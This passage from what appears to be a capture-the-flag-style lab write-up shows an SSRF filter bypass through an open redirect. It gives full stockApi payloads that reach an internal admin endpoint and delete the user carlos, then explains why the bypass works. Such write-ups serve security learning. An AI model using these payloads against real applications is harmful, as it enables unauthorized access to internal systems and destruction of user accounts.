so this is not a redirection .

but next product option request is :

this is a redirection response let's play with it .

let's delete carlos :) 
```
we can't make this action from next product redirection page beacuse it will redirect us to 192.168.0.12 and we can't display it ,

so we can use this  to check response found and use this in the stockApi
```
now we can write a url redirect the stockApi to the page we want 

` /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`

````

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin

This SSRF exploit works because the application first validates that the supplied stockAPI URL is on an allowed domain, which it is. 

The application then requests the supplied URL, which triggers the open redirection. It follows the redirection, and makes a request to the

internal URL of the attacker's choosing.
